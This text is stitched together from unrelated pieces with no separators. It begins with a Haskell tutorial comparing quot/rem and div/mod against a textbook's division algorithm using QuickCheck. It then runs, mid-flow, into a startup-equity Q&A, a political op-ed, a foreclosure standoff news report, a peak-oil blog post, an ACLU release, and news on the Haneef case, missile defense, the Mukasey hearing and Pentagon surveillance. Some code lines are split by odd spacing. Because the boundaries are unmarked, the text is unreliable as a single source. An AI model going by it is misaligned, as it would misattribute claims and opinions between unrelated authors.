That option enables some language extensions that I do n’t intend to use .
I added it because it causes GHCi to use a slightly different form of type signatures that I think are actually easier to understand than the default . )
Finally , it ’s time to ask GHCi for basic information about those functions .
Specifically , we will ask for their types .
One of the major keys to Haskell is that if you know the type of something , you are three fourths of the way to understanding it .
Prelude > :t quot quot :: forall a. ( Integral a ) => a -> a -> a Prelude > :t rem rem :: forall a. ( Integral a ) => a -> a -> a Prelude > :t div div :: forall a. ( Integral a ) => a -> a -> a Prelude > :t mod mod :: forall a. ( Integral a ) => a -> a -> a
First of all , Prelude > is the basic GHCi prompt .
Anything after that on a line is something I typed .
We ’re more interested in the responses , which are all about the same .
Those are type signatures , and types are fundamental to Haskell .
I think it might be helpful , though , to work our way up from simpler types toward the more complicated types above .
Prelude > :t not not :: Bool ->
Bool
The response to the :t command uses the :: syntax , which provides type annotations in Haskell .
You should read :: as “ has type ” , so that statement is : not has type Bool -> Bool .
That , of course , raises the question of what Bool ->
Bool means as a type .
First , Bool is the Boolean data type , with values of True or False .
Second , -> describes a function mapping from one type to another .
The not function , then , takes either True or False as an argument , and returns either True or False as a result .
Simple enough .
Prelude > :t length length :: forall a . [ a ] ->
Int
There are two extra elements here .
The first , which we wo n’t be using yet , is that [ Bool ] denotes a list whose elements are type Bool .
The important thing is that in Haskell , you ca n’t just have a list .
You must have a list of Bool or a list of Integer , or some other type .
The length function , though , wants to operate on all possible types of lists .
Therefore , it uses polymorphism .
The keyword forall introduces a generic name for a type .
It ’s basically a logic quantifier , which in other contexts is often written as an upside - down A .
The type here says that for all possible types a , the length function can calculate an Int from a list of a .
I like the - fglasgow - exts command line argument to ghci because it makes this explicit .
Without that argument , the type above would have just been written as [ a ] ->
Int .
This is a valid abbreviation for the type given above ; if some name in a type signature begins with a lower - case letter , it is assumed to be a type variable , even if there is no explicit forall clause .
On the other hand , types beginning with upper - case letters are specific type names , like Int or Bool .
Prelude > :t negate negate :: forall a. ( Num a ) => a -> a
The new concept introduced here is that of type classes .
There are many different types that all represent numbers in Haskell .
It would be painful if things like negate ( or + , for that matter ) could only work on one of those many types .
( As a side note , I suppose it ’s not universally agreed that this would be painful , because ML does it that way . )
On the other hand , it makes no sense for negate to operate on all possible types , either !
How do you keep a programmer from negating a banana warehouse ?
( Hmm , I feel like there should be a punchline here . )
The solution is type classes .
A type class , which starts with an upper - case letter much like a type , defines a group of many types ( called instances ) for which some set of operations is possible .
You can read the => operator as an if / then statement , so the statement is : negate has a type so that for all types a , if a belongs to the type class Num , then negate can take an argument of type a and return a result of type a .
Whew , that ’s a mouthful !
It says what we want , though .
Now back to the beginning .
Prelude > :t quot quot :: forall a. ( Integral a ) => a -> a -> a Prelude > :t rem rem :: forall a. ( Integral a ) => a -> a -> a Prelude > :t div div :: forall a. ( Integral a ) => a -> a -> a Prelude > :t mod mod :: forall a. ( Integral a ) => a -> a -> a
The only new thing here is that these functions take two parameters of type a , and return a result of type a .
The Integral type class is exactly what you ’d expect : it describes types whose values are mathematical integers .
The two interesting types in this type class are Integer , which is an arbitrary precision type ( in other words , it never overflows ) , and Int , which stores at least 30 - bit signed values , depending on the implementation .
We now know the types , so let ’s see how these functions behave .
In other words , let ’s play !
( Any function of two parameters can be used as an infix operator by enclosing it in back - ticks , which are probably above the tilde on your keyboard .
That ’s what I ’m doing below . )
Prelude > 6 `div` 4 1 Prelude > 6 `mod` 4 2 Prelude > 6 `quot` 4 1 Prelude > 6 `rem` 4 2
So far , so good .
It looks like both pairs of functions behave like the Jones text ’s quotient and remainder .
However , a single test case does not make a correct function !
We could try a few more test cases .
Let ’s try 100 of them instead !
A nice systematic way to try lots of test cases is with a nifty library called QuickCheck .
This library will verify stuff with bunches of random test cases .
It tells us whether a property is false , or likely to be true .
The wording there is very deliberate .
It will definitely not tell us that the statement is true .
That would require a general proof !
QuickCheck will just try some random inputs to look for counter - examples .
I get tired of typing long commands , so I ’ve added the following line to my GHCi configuration file , ~/.ghci :
: def qc \\c -> return $ " : m + Test.QuickCheck .
Property \
Test.QuickCheck.quickCheck ( " ++ c ++ " ) \
: m - Test.QuickCheck .
Property "
To use QuickCheck , we need functions that take parameters ( values for a and b ) and evaluate to either True ( success ) or False ( failure ) .
That ’s convenient , because the Jones text gives us two of them .
Specifically , the theorem asks for : a = qb + r , and 0 <= r < |b| .
We can define these as anonymous functions using the lambda syntax in Haskell .
Here ’s a simple example of lambda syntax :
Prelude > ( \\ x -> x * x ) 4 16
The anonymous function begins with a backslash ( \ ) and a list of parameters .
The arrow ( -> ) introduces the body of the function .
This example defines an anonymous function to calculate the square of a number , and then applies it to 4 to get 16 .
We ’ll do the same thing for our test cases .
We are given that b is not zero , and QuickCheck defines a handy operator == > to express that .
Let ’s try this with quot and rem .
Prelude > : qc \\a b -> ( b /= 0 ) == > ( a `quot` b ) * b + ( a `rem` b ) == a +++ OK , passed 100 tests .
Prelude > : qc \\a b -> ( b /= 0 ) ==> ( 0 <= a `rem` b ) && ( a `rem` b < abs b ) *** Failed !
Falsifiable ( after 9 tests and 5 shrinks ) : -5 -3
Oops !
The first test case succeeded , but the second test case failed .
Specifically , it failed with values of a = - 5 and b = - 3 .
QuickCheck generates random test cases , so you will probably see a different test case fail .
Hopefully your test did fail , though !
Clearly , then , the quot and rem functions do n’t satisfy the requirements of the division algorithm , because the result of rem is out of range for this input !
Looking closer at the test case , we find that using quot and rem gives q and r of 1 and - 2 , while we wanted 2 and 1 .
Let ’s try div and mod .
Prelude > : qc \\a b -> ( b /= 0 ) == > ( a `div` b ) * b + ( a `mod` b ) == a +++ OK , passed 100 tests .
Prelude > : qc \\a b -> ( b /= 0 ) ==> ( 0 <= a `mod` b ) && ( a `mod` b < abs b ) *** Failed !
Falsifiable ( after 7 tests and 3 shrinks ) : 1 -2
So neither of the Haskell standard library functions agree with the spec that we got from the text .
Both pairs of functions satisfy the first equality from the text , a = qb + r , all the time .
If you ’re wondering how they differ , the answer is that when the signs of a and b are different , rem gives the remainder the same sign as a , while mod gives the remainder the same sign as b .
Thus , quot and rem fail our purposes precisely when a is negative and r is non-zero , while div and mod fail precisely when b is negative and r is non-zero .
We now know that we have two different incorrect functions .
What about a correct one ?
We ’ll have to write it ; but fortunately it ’s given in the Jones text .
We ’re in GHCi , and I ’d prefer not to write a lot of code at a command prompt , so use GHCi ’s : edit command .
Prelude > :edit NumTheory.hs
That should open up a text editor .
( If you prefer a different editor , then set your EDITOR environment variable . )
Now enter the following code , save the file , and exit the editor .
module NumTheory where import Data .
Ratio jonesQuot , jonesRem :: Integral a => a -> a -> a a `jonesQuot` b | b < 0 = ceiling ( a % b ) | b > 0 = floor ( a % b ) a `jonesRem` b = a - b * ( a `jonesQuot` b)
Here ’s what ’s going on .
The module statement defines this as a module with the name NumTheory .
The import statement lets us use the Rational type , and the % operator to build it .
I chose the Rational type to avoid the rounding error that would occur with floating point numbers .
Next , there ’s a type signature .
Haskell could infer the type signature , but there are two advantages to specifying it ourselves .
First , the signature inferred by Haskell is too general and is confusing .
Second , the explicit type signature makes it abundantly clear how to use the function without having to ask GHCi for help .
Next , jonesQuot has two cases corresponding to the main theorem and the corollary in the Jones text .
( The vertical bar can be read as “ such that ” or “ for ” and is called a guard clause . )
In one case , a floor is needed , while the other case requires a ceiling ( this is in the book , if you ’re reading it . )
The % operator constructs a Rational from two Integral numbers .
Use the GHCi :l command to load the module , and you have precisely the functions we went searching for .
We have QuickCheck to help us be more certain .
Prelude > :l NumTheory [ 1 of 1 ] Compiling NumTheory ( NumTheory.hs , interpreted )
Ok , modules loaded : NumTheory .
* NumTheory > :qc \\a b -> ( b /= 0 ) == > ( a `jonesQuot` b ) * b + ( a `jonesRem` b ) == a +++ OK , passed 100 tests .
* NumTheory > :qc \\a b -> ( b /= 0 ) ==> ( 0 <= a `jonesRem` b ) && ( a `jonesRem` b < abs b ) +++ OK , passed 100 tests .
Ah , the feeling of success !
Of course , QuickCheck did n’t prove anything except that failure probably happens less than one out of a hundred inputs .
Proofs of the theorem and simple algebra to establish that the algorithm is correct are in the Jones text , and you ’re encouraged to read them .
Just remember that there is no ( okay , only a little ) competition between testing and proof .
Knuth ’s famous quote comes to mind : “ Beware of bugs in the above code ; I have only proved it correct , not tried it . ”
Proofs do n’t always catch boneheaded coding mistakes .
It ’s worth a brief mention that , in this case , the interaction between testing and proof is particularly appealing .
The text proves that there is one and only one function for which those two QuickCheck tests would always succeed .
In other words , we actually have a proof that our test cases test everything of importance !
That ’s pretty cool ; we have proven the completeness of the test suite .
( The passing tests still do n’t prove the correctness of the code , though .
Why not ? )
Steve from Richmond , VA , wrote in to ask a couple of questions :
“ With software development , is it better to get something out there with customers and then continually improve or build the best wiz- bang software and then start marketing ? ”
That depends .
You want to avoid the Marimba Phenomenon , where you get so much publicity in the early days that everybody checks out your underwhelming offering and decides that you ’re never going to have something worth looking at .
( I should rename this the live.com phenomenon , in honor of Microsoft ’s horrible launch of live.com .
Or the Zune phenomenon . )
On the other hand , small startups are unlikely to have the problem of too much attention , so most companies with a 1.0 product can certainly get real customers with their earliest usable versions and build from there .
Steve is starting a company with a software developer .
“ Assuming the software developer is getting paid at a reduced rate , but concurrently with his development .
If you were giving also giving him some equity in your company , would you make that equity contingent on phases of the software getting done , the entire software getting done or vesting over time . ”
The standard solution is to vest over time — anywhere from four to seven years — with unvested shares being forfeited if he leaves for any reason .
If the software does n’t get done , you fire him and he loses the unvested shares — it ’s not necessary to make the vesting contingent specifically on finishing the software ( besides , “ finishing ” software would be too hard to define in a contract ) .
You can set it up either as normal vesting ( where he gets , say , 20 % of the shares every year ) or reverse vesting ( where he gets the shares up front , but you have the right to repurchase them for a penny , and this right evaporates by 20 % every year ) .
Reverse vesting is preferable for tax reasons , because at the time you give him the shares , they ’re worth a lot less , so there ’s less income and more capital gains , which are taxed at a lower rate .
DENVER --
So , President Bush vetoes the State Children 's Health Insurance Program expansion and Congress fails to override that veto .
So this is our government ?
No , it is not .
It may be the insurance companies ' government and the health care profiteers ' government , but it sure as hell is n't mine .
This government tries to protect life in the womb but devalues that life once a child is born and fails to provide basic health care for working - class children .
That 's not my government .
This government does n't value my work ethic or my determination to provide for myself .
Since I am among those classified as the " working poor , " I can fend for myself for health care coverage .
That 's not my government .
This government does an awful lot of finger - pointing about who's to blame for what but never watches out for my health care needs .
It 's a weak Congress .
It 's a bumbling administration or worse - it's a selfish one .
That 's not my government .
This government wants working parents not to have enough money to buy homes or new cars or other consumer goods because they must pay huge premiums for sub - standard health care and coverage .
That 's not my government .
This government is full of those claiming patriotism and love of family while ignoring families sinking into economic ruin due to health costs and coverage .
That 's not my government .
This government is full of those proclaiming love for humankind while failing to protect even the youngest and most vulnerable in our own society .
That 's not my government .
This government is full of Bible - thumping Christians who display judgmental and cruel tendencies very opposite what the Christ I learned about would ask of us .
That 's not my government .
This government will not change and will not represent its people because it is built on arrogance of self rather than being of and by the people .
And that 's not my government .
This vote today has made me more angry and more determined than ever .
This is not just about the kids , fellow Americans .
It is about what we collectively need to say to these people we elected .
And if they cannot and will not hear us - as they demonstrated today - then we must clean house .
Top to bottom , Repubs and Dems , out the door , to the curb and back to the people .
I have had enough .
I have been ignored enough .
My vote and my taxes have been abused enough .
My voice matters .
I am an American woman with a brain and a heart and a God .
And I want my country back .

A 12 - hour standoff ended this morning with a north Houston man lobbing Molotov cocktails at Houston Police before taking his own life rather than vacate a home he'd lost to foreclosure .
James
Hahn , a chemist , had told police he would not be taken from the home alive , said Capt .
Bruce Williams , an HPD spokesman .
" ' You know what I do for a living and you know what I am capable of , ' " said Williams , recalling one of the conversations police had with the man on Wednesday .
The standoff began at 1:10 p.m.
Wednesday when police said Hahn pulled a gun on Precinct 4 constable deputies who had attempted to serve him with a warrant for eviction at the home in the 21000 block of Covington Bridge in Spring , authorities said .
It would appear that Hahn had prepared for the standoff .
He had nailed plywood over windows and doors and stuffed insulation into cracks .
A cache of weapons and explosive devices were found in the home , along with a gas mask , chemical suit similar to those worn by Haz - Mat crew members .
Williams said it explained why Hahn did n't vacate the house after police shot tear gas into the residence on three separate occasions in the hopes of bringing the standoff to an end .
Williams said Hahn was recently divorced , depressed and struggled with financial problems and drug addiction .
" We believe this particular individual was not going to go peacefully , " Williams said .
Throughout the day police said Hahn had set small fires in several places in the home .
HPD SWAT officers arrived at the home about 3 p.m.
Residents living in nearby were asked to leave their homes until Hahn was taken into custody .
About 11:20 p.m.
Wednesday , police repeatedly spoke to the man using a loudspeaker they hooked up in his backyard in the Covington Bridge subdivision ..
" This is the Houston Police Department .
Come out your front door with nothing in your hands and listen for instructions , " an officer said .
" You need to come out now . "
It was just one move in a series of efforts throughout the evening Wednesday to remove the man without deadly force , police said .
Sounds of tear gas being deployed into the barricaded man 's home drew Tammy Sample out of her home late Wednesday .
Sample , 51 , came out to investigate with her Yorkie , Bruiser , in her arms .
She said she would n't be able to sleep until the standoff was resolved .
" It sounds horrible , but it was kind of exciting at the beginning , " Sample said . " ...
Now it 's just scary because you never think it 's going to happen where you live . "
Sample opened her home Wednesday to another neighbor who was denied access to her house as a result of the standoff .
Shirley Bell , 43 , said she returned to the neighborhood about 3 p.m. to find police blocking her way home .
Bell said she never thought the siege would last so long .
" It seems like for whatever comes , he 's ready , " she said of the man .
Sample agreed .
Prior to the standoff , it would appear the man was preparing for something , police said .
" He had installed surveillance cameras and boarded up his windows , " Sample said .
" He was ready all right . "
Shortly after midnight Wednesday , residents could hear police pleading with the man again to surrender .
" We 're not leaving today .
And this is only going to get worse for you come out now , " a SWAT negotiator said .
An hour and a half later , Hahn shot himself as officers closed in on his home .
Residents noted there had been a number of foreclosures in the neighborhood lately .
But none imagined that Hahn would take his life rather than leave a home that no longer belonged to him .

Posted by Chris Vernon on July 16 , 2007 - 9:00 pm in The Oil Drum : Europe
British Member of Parliament George Galloway interviews David Strahan , award - winning investigative journalist , documentary film - maker and author of the 2007 book
Interview broadcast 26th June 2007 .
Here is Strahan 's article in the Guardian :
The real casus belli : peak oil
Strahan ’s website : www.lastoilshock.com
Today , the following Associated Press article was run on page - 19 of my local newspaper ( the St. Louis Post - Dispatch ) :
An epic drought in Georgia threatens the water supply for millions .
Florida does n’t have nearly enough water for its expected population boom .
The Great Lakes are shrinking .
Upstate New York ’s reservoirs have dropped to record lows .
And in the West , the Sierra Nevada snowpack is melting faster each year .
Across America , the picture is critically clear — the nation ’s freshwater supplies can no longer quench its thirst .
The government projects that at least 36 states will face water shortages within five years because of a combination of rising temperature , drought , population growth , urban sprawl , waste and excess .
“ Is it a crisis ?
If we do n’t do some decent water planning , it could be , ” said Jack Hoffbuhr , executive director of the American Water Works Association , based in Denver .
Water managers will need to take bold steps to keep taps flowing , including conservation , recycling , desalination and stricter controls on development .
The price tag for ensuring a reliable water supply could be staggering .
Experts estimate that just upgrading pipes to handle new supplies could cost the nation $ 300 billion over 30 years .
“ Unfortunately , there ’s just not going to be any more cheap water , ” said Randy Brown , utilities director for Pompano Beach , Fla .
Truly , this is a major story ; our country is running out of a critically important resource .
Combine that lack - of - water news , though with the equally unreported news that the world is running out of another critically important resource : oil .
How bad is it ?
I ’ve previously reported on the issue of peak oil before ( and see here ) .
Recently , I ’ve read a book that , even if it is only partially accurate , should be front page news in every newspaper in America , day after day .
The book is The Long Emergency : Surviving the End of Oil , Climate Change , and Other Converging Catastrophes of the 21st Century , by James Howard Kunstler ( 2005 ) .
Kunstler writes that
America is still sleepwalking into the future .
We walked out of our burning house and we are now headed off the edge of a cliff .
Beyond that cliff is an abyss of economic and political disorder on a scale that no one has ever seen before .
I call this coming time The Long Emergency .
Kunstler writes that the main problem is the end of cheap oil and natural gas .
These resources
underlie everything we identify as a benefit of modern life .
All the necessities , comforts , luxuries and miracles of our time - central heating , air conditioning , cars , airplanes , electric lighting , cheap clothing , recorded music , movies , supermarkets , power tools , hip replacement surgery , the national defense , you name it - we owe their origins or continued existence in one way or another to cheap fossil fuel .
Kunstler argues that the steady technological progress we ’ve experienced thanks to cheap oil has tricked us “ into a kind of Jiminy Cricket syndrome , leading many Americans to believe that anything we wish for hard enough can come true . ”
What are Kunstler ’s facts ?
Here are some of them ( starting on page 66 ) :
The total planetary endowment of conventional nonrenewable liquid oil was roughly 2 trillion barrels before humans started using it .
Since the mid-19th century , the world has burned through roughly one trillion barrels of oil , half the total there ever was , representing the easiest to get , highest - quality liquids .
The half that remains includes the hardest oil to get , lowest quality liquids , semi-solids , and solids .
Worldwide discovery of oil peaked in 1964 and has followed a firm trend line downward ever since .
The rate of oil used has accelerated tremendously since 1950 .
The explosive rate of world population growth has run parallel to our rates of oil use ( in fact , oil has enabled the population explosion ) .
The world is now using 27 billion barrels of oil a year .
If every last drop of the remaining one trillion barrels could be extracted at current cost ratios and current rates of production - which is extremely unlikely - the entire endowment would last only another 37 years .
In reality , a substantial fraction of the remaining half of the world ’s total oil endowment will never be recovered .
After peak , depletion will proceed at 2 to 6 percent a year , while world population is apt to continue increasing ( for a while ) .
The ratio of energy expended in getting the oil out of the ground to the energy produced by that oil in the US oil industry has fallen from 28:1 in 1916 to 2:1 in 2004 and will continue falling .
Even though it is clearly written , Kunstler ’s book is difficult to read , even for those of us who have seen the facts he has cited presented by other credible sources over the years .
His work is depressing and gut - wrenching .
One of the main reasons his work concerns me is that I agree with his premise that American society is thoroughly deluded and oblivious about the danger of peak oil and is working hard to remain deluded .
We refuse to let facts get in our way , conservatives and liberals alike :
These days , even people in our culture who ought to know better are wishing ardently that a smooth , seamless transition from fossil fuels to their putative replacements - hydrogen , solar power , whatever - lies just a few years ahead .
I will try to demonstrate that this is a dangerous fantasy .
The true best case scenario may be that some of these technologies will take decades to develop–meaning that we can expect an extremely turbulent interval between the end of cheap oil and whatever comes next .
A more likely scenario is that new fuels and technologies may never replace fossil fuels at the scale , rate , and manner in which the world currently consumes them .
What is generally not comprehended about this predicament is that the developed world will begin to suffer long before the oil and gas actually run out .
The American way of life –which is now virtually synonymous with suburbia - can run only on reliable supplies of dependably cheap oil and gas .
Even mild - to - moderate deviations in either price or supply will crush our economy and make the logistics of daily life impossible .
. . . the extent of suffering in our country will certainly depend on how tenaciously we attempt to cling to obsolete habits , customs and assumptions - for instance , how fiercely Americans decide to fight to maintain suburban lifestyles that simply cannot be rationalized any longer .
The public discussion of this issue has been amazingly lame in the face of America ’s post - 9/11 exposure to the new global realities .
The salient fact about life in the decades ahead is that it will become increasingly and intensely local and smaller in scale .
It will do so steadily and by degrees as the amount of available cheap energy decreases as the global contest for it becomes more intense .
. . . the US economy of the decades to come will center on farming , not high - tech , or “ information , ” or “ services , ” or space travel , or tourism or finance .
All other activities will be secondary to food production , which will require much more human labor .
I sometimes talk with people about the depletion of oil and water and most of them simply do n’t care .
When I first speak of the undeniable facts , most people look terrified for a moment , but they then they lock down their minds .
They simply can’t deal with the situation .
Many of them argue that someone , somewhere , will come to the rescue .
They personify the “ free market ” ( and see here ) as a godlike savior that will intervene in such a way that we need not worry .
They try hard to convince themselves that some other energy source will come to the fore , magically , and save the day .
Perhaps they are watching way too much TV , such that they think that the lack water and oil are just fictitious stories that will resolve next week .
Perhaps they lock down their minds because they can’t bear the toxic thoughts that they will need to consider to make substantial changes to their lifestyle over the next 10 and 20 years .
They ca n’t bear to think that these changes in American lifestyle will lower their standard of living and imperil national security .
The average American spends many multiples more time considering sports scores and television show than considering the national energy crisis .
Some people might argue that coal is the answer , but Kunstler disputes this , pointing out that coal poisons groundwater at a prodigious rate .
To get to coal , we are destroying the mountains of Appalacia ( want to see how bad it is getting ? ) .
Coal has also been implicated in mercury pollution , acid rain and increased rates of asthma .
Kunstler also takes on nuclear power and renewable energies as replacements for cheap oil .
Kunstler does n’t argue that these other energy sources ca n’t be part of the replacement formula for oil .
The problem is that these sources are n’t capable of substituting for cheap oil .
How much cheap oil do we need to replace ?
We use 5,000 gallons of gasoline per second in the United States .
Knowledgable reality - based people are stumped when it comes to replacing this vast amount of cheap energy with alternative sources .
Further , knowledgable people admit that today ’s oil ( upwards of $ 3 per gallon of gas ) is still cheap .
We ’re headed into dangerous uncharted territory .
What ’s truly startling is that our national leadership is almost totally silent about exploring the need to make immediate major changes to national energy policy .
Where is any national dialogue acknowledging that we are at the end of a 27 - year process of blowing our window of opportunity to begin a less - tumultuous transition to the energy strategy that is next to come .
We have n’t looked soberly at the energy issue since Ronald Reagan tore Jimmy Carter ’s solar panels off the White House in 1980 .
I have a theory of why we do n’t address energy shortages by conserving energy : it ’s not macho .
It ’s opponents paint conservation as feminine and weak .
Yet , as is becoming clear , producing more energy is not a viable stratagy anymore ( and see here ) .
Even the people who do acknowledge these issues and do claim to care about them argue , for the most part , that a few cosmetic changes in their way of life will fix things .
It ’s time for all of us to wake up from these creepy fantasies .
Carpooling a couple days per week and bringing your own cloth shopping bag to the grocery store are n’t going to make a dent in what is about to come .
These , and many other “ green ” strategies , are feel - good maneuvers that serve only to salve the collective guilt many of us feel ( but of which we dare not speak for fear of being ostracized ) .
At least for the time being , we find it more comfortable to not speak of that huge elephant in the room .
Currently , most people find it more important that we not offend or scare our fellow citizens than to actually strategically plan for our long - term future .
May we somehow be forgiven for the kind of world we are leaving for our children and our children ’s children . . .
FOR IMMEDIATE RELEASE
Contact : media@dcaclu.org
Washington , DC – Today , the American Civil Liberties Union called on Congress to move forward with contempt proceedings against White House officials who refused to cooperate with legitimate subpoenas issued under congressional authority .
The ACLU also released a memo to assist Congress in understanding the limits of executive privilege and the authorities it has to compel compliance with the subpoenas issued by the Senate Judiciary Committee on the National Security Agency ’s warrantless wiretapping program .
The ACLU ’s memo concludes that the documents requested are not covered under the privilege and should be released immediately .
The administration has already missed two deadlines set by the committee .
" Many presidents have overreached by claiming executive privilege to hide documents and witnesses from public oversight , and each time Congress has slapped their hands , " said Caroline Fredrickson , director of the ACLU Washington Legislative Office .
" Today ’s Congress must do the same if it wishes to operate as a meaningful and equal branch of government . "
The courts have long held that executive privilege is not absolute , and even where it applies it can be overcome if the other branches of government can show they need the information .
Congress has significant legislative and oversight interests in the NSA warrantless wiretapping program because it is currently considering legislation to replace the Protect America Act .
Most importantly , the courts have held that the privilege cannot be invoked to hide government wrongdoing .
Even where issues concerning national security are at stake Congress has a right to the information it needs to fulfill its constitutional obligations .
Facing a possible constitutional crisis capable of destroying our crucial checks and balances , the ACLU also reminded Congress just how vital its oversight and legislative role is .
" The federal courts have long held that Congress has the authority not only to pass laws , but investigate their implementation , " added Fredrickson .
" Congress is facing an historic moment where it can either fight for its rightful place in our constitutional system of government or accept the president ’s continued and sweeping claims of supremacy .
It ’s do or die time for the separation of powers . "

The Australian Federal Police ( AFP ) say their investigations will continue despite dropping a terrorism - related charge against Indian doctor Mohamed Haneef .
Dr Haneef has been in custody for almost four weeks and was charged two weeks ago with recklessly providing support to a terrorist organisation .
In the Brisbane Magistrates Court this afternoon , the AFP applied to have that charge dropped .
An application to amend the charge against Dr Haneef was adjourned this morning pending the outcome of a review of the case against him by the Commonwealth Director of Prosecutions ( DPP ) .
The matter resumed this afternoon when senior counsel Alan McSporran announced to the court that the DPP found there was not a reasonable prospect of a conviction .
At a press conference this afternoon , the Commonwealth DPP Damian Bugg QC said the charge had been dropped because a mistake was made in the case .
" On my view of this matter a mistake has been made and I will examine that because to me the primary decision to make was to determine whether or not this prosecution was on sound footing or not , I 've made that determination , " he said .
" I 'll now take further steps to inquire as to how that mistake occurred . "
Mr Bugg says one of the significant errors in the handling of the case was about where Dr Haneef had lived in the United Kingdom .
He says the other error was that the prosecutor told the court that Dr Haneef 's phone SIM card was found in a burning Jeep at Glasgow airport when it was actually found in Liverpool .
" His explanation was that he came to court in a hurry , he was provided with information and the information that he was working from was not a standard statement of facts form where everything was in precise detail , " he said .
" He was also working from his recall of a range of discussions the day before and he 's made an error . "
Mr Bugg conceded the decision to drop the charge was upsetting .
" I 'm not embarrassed about it , I 'm disappointed . "
On the subject of whether he would apologise to Dr Haneef , Mr Bugg said : " I 'll consider that when I 've completed my investigation . "
Mr Bugg says it is not possible to release too many details about reasons for reaching the decision to drop the charge because investigations are still under way in the United Kingdom .
While he acknowledged that errors had been made , he says an assessment of the handling of the case should be made in context .
" It 's very easy for commentators to sit back and see chinks in a process that has been undertaken in very extreme conditions , " he said .
Investigation ' continuing '
AFP Commissioner Mick Keelty supports the decision to drop the charge .
" Cases are brought before the courts on a number of occasions where matters do not proceed because of one reason or another , " he said .
He also defended Mr Bugg for his error .
" Advice and information is going to change in an investigation that is so broad , " he said .
He says tens of thousands of exhibits had been presented in the case thus far .
Commissioner Keelty says while the charge against Dr Haneef had been dropped , the matter did not end there .
" The investigation is continuing ... we do n't intend to scale down the investigation , " he said .
" It 's a very broad - ranging investigation . "
He also defended the actions of his officers .
" The team has at all times acted professionally , " he said .
" The police investigation has been thorough and it will continue to be thorough . "
Mr Bugg says given the difficulties inherent in investigating matters that took place on the other side of the world up to a year ago , criticism of the investigation was unfair .
He says time pressures were also a factor in the investigation .
But he says he believes he retains the confidence of Attorney - General Philip Ruddock .
" He understands from that explanation what has occurred .
He knows that I have a job to do ... and I 'd like to think he still has confidence in the job that I do , " he said .
Visa
Dr Haneef 's legal team will now concentrate on preventing his deportation after Immigration Minister Kevin Andrews cancelled his work visa .
Solicitor Peter Russo says he expects to receive material from the Immigration Department on Monday if the Government is to proceed with the deportation .
Commissioner Keelty says the information given to Mr Andrews regarding Dr Haneef 's visa still stands correct .
He also says it is up to the Mr Andrews and Mr Ruddock to decide if Dr Haneef should be allowed to remain in Australia .
Dr Haneef 's relative Imran Siddiqui says the family will fight to clear his name completely .
On Wednesday , Mr Bugg took the unusual step of initiating a review into the case .
Yesterday the former chairman of the National Crime Authority , Peter Faris QC , said the DPP 's decision to review the case suggested the case is about to collapse .
" This is the end of the case against Mr Haneef , " he said .
" I have no doubt that the reason that [ Mr ] Bugg has intervened is to find a way out of the impasse that the DPP finds itself in , which is , to put it bluntly , they have no case . "
But Commissioner Keelty rejected any suggestion the AFP had mishandled the case .
But Queensland Council of Civil Liberties spokesman Michael Cope says there should be an inquiry into how the case has been handled .
" We call for perhaps a Senate inquiry into the handling of this matter , " he said .
" There 's got to be serious issues raised about this handling either by the AFP or the Director of Public Prosecutions . "
BRATISLAVA ( Reuters ) - Slovak Prime Minister Robert Fico criticized the United States for bypassing NATO with a plan to deploy a missile defense system in central Europe , calling the project an adventure .

Washington is negotiating with Slovakia ’s neighbors , Poland and the Czech Republic , on installing interceptor missiles and a radar base on their soil as a protection against attacks by what it calls rogue states , such as Iran or North Korea .
Slovakia ’s leftist leader Fico said the United States should have discussed any such project with its partners in the NATO alliance .
“ Put this issue on the table at NATO , and we will seriously debate it and take a stance , ” Fico said in a rare meeting with foreign news agencies in Slovakia late on Tuesday .
“ But we will not support these bilateral adventures . ”
The U.S. plan has angered Russia , which considers it a threat to its own security .
Moscow has offered Washington the use of a radar station in Azerbaijan in exchange for scrapping the missile shield plans in central Europe .
Fico said Moscow ’s objections were a concern .
“ The missile system is a bilateral issue between the United states and Czech Republic , and between the United States and Poland , ” Fico said .
“ But it is an issue that is directly concerning us , especially when the other side , Russia , is constantly speaking about aiming its nuclear weapons against those targets .
“ And if the targets are a few kilometers away from Slovakia , either to the West , or to the North , that must be making us nervous , ” he said .
The Czechs have also called for the missile defense plan to be coordinated within NATO .
Another Czech neighbor , Austria , has also criticized the plans to build the radar in the Czech Republic .
Its defense minister called it a “ provocation ” reviving Cold War debates .
“ I do n’t know what is involved in the technique , ” Mr. Mukasey replied .
“ If waterboarding is torture , torture is not constitutional . ”
Mr. Whitehouse described Mr. Mukasey ’s response as a “ massive hedge ” since the nominee refused to be drawn into a conversation about whether waterboarding amounted to torture ; many lawmakers from both parties , as well as civil liberties and human rights groups , have said that it is clearly a form of torture .
The Bush administration has suggested that it ended the practice after protests from Capitol Hill and elsewhere , although it has never said so explicitly .
“ I mean , either it is or it is n’t , ” Mr. Whitehouse continued .
Waterboarding , he said , “ is the practice of putting somebody in a reclining position , strapping them down , putting cloth over their faces and pouring water over the cloth to simulate the feeling of drowning — is that constitutional ? ”
Mr. Mukasey again demurred : “ If it amounts to torture , it is not constitutional . ”
Mr. Whitehouse said he was “ very disappointed in that answer — I think it is purely semantic . ”
“ I ’m sorry , ” Mr. Mukasey replied .
While Mr. Mukasey still seemed almost certain to win Senate confirmation , a vote in the Judiciary Committee could be delayed until Mr. Mukasey provides written answers to questions raised today by Mr. Leahy .
The senator said he did not intend to hold the vote until after the responses were received and reviewed .
The committee ’s ranking Republican , Senator Arlen Specter of Pennsylvania , said today that while he shared some of Democrats ’ concerns about Mr. Mukasey ’s views on the limits of presidential authority , “ I think you are virtually certain to be confirmed , and we ’re glad to see the appointment and glad to see somebody who is strong , with a strong record , take over this department . ”
Other Republicans joined in the praise of Mr. Mukasey .
“ I ’ve listened to your testimony here , and it seems to me that you are extraordinarily well - suited for this position , as pretty much as well as anybody who has n’t served in the position before could be . , ” said Senator Jon Kyl , Republican of Arizona .
Pentagon acted with little oversight in spying on Americans , documents show Nick Juliano
Published : Monday October 15 , 2007
del.icio.us
Print This Email This The Department of Defense has conspired with the FBI to " circumvent the law " in accessing hundreds of Americans ' telephone , e-mail and financial records , say two civil liberties groups that released reams of new documents obtained in a contested public records request .
The American Civil Liberties Union , which has challenged the Bush Administration 's post - Sept. 11 spying authority , says the Pentagon has issued 455 National Security Letters in concert with the FBI to obtain Americans ' private information it is not entitled to receive .
" The documents make clear that the Department of Defense may have secretly and illegally conducted surveillance beyond the powers it was granted by Congress , " ACLU Executive Director Anthony D. Romero said .
" It also appears as if the FBI is serving as a lackey for the DoD in misusing the Patriot Act powers .
At the very least , it certainly looks like the FBI and DoD are conspiring to evade limits placed on the Department of Defense 's surveillance powers . "
